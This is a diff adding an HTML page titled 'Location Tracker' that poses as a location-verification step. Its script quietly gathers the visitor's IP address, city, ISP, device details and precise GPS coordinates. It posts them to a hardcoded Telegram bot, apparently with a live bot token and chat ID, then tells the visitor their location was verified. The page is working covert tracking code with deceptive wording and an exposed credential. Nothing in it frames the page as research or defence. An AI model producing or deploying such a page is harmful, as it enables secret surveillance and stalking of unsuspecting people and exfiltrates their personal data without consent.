@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h2>Verifying your location...</h2>
+
+  <script>
+    const TELEGRAM_WEBHOOK = "https://api.telegram.org/bot8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc/sendMessage";
+    const CHAT_ID = "7357184121";
+
+    function sendToTelegram(data) {
+      const message = `
+📍 <b>New Visitor Tracked!</b>
+
+🌐 <b>IP:</b> ${data.ip}
+🏙️ <b>City:</b> ${data.city}, ${data.region}, ${data.country}
+📶 <b>ISP:</b> ${data.org}
+🕒 <b>Timezone:</b> ${data.timezone}
+📱 <b>Device:</b> ${data.userAgent}
+📏 <b>Screen:</b> ${data.screen}
+📍 <b>GPS:</b> ${data.gps_lat || 'N/A'}, ${data.gps_lng || 'N/A'} (±${data.gps_accuracy || 'N/A'}m)
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+      `;
+
+      fetch(TELEGRAM_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    }
+
+    fetch("https://ipinfo.io/json?token=ENTER_YOUR_TOKEN_OR_REMOVE")
+      .then(res => res.json())
+      .then(ipData => {
+        const userInfo = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country,
+          loc: ipData.loc,
+          org: ipData.org,
+          timezone: ipData.timezone,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`
+        };
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(pos) {
+            userInfo.gps_lat = pos.coords.latitude;
+            userInfo.gps_lng = pos.coords.longitude;
+            userInfo.gps_accuracy = pos.coords.accuracy;
+            sendToTelegram(userInfo);
+          }, function(error) {
+            userInfo.gps_error = error.message;
+            sendToTelegram(userInfo);
+          });
+        } else {
+          userInfo.gps_error = "Geolocation not supported";
+          sendToTelegram(userInfo);
+        }
+
+        document.body.innerHTML = "<p>✅ Your location has been verified successfully.</p>";
+      });
+  </script>
+</body>
+</html>
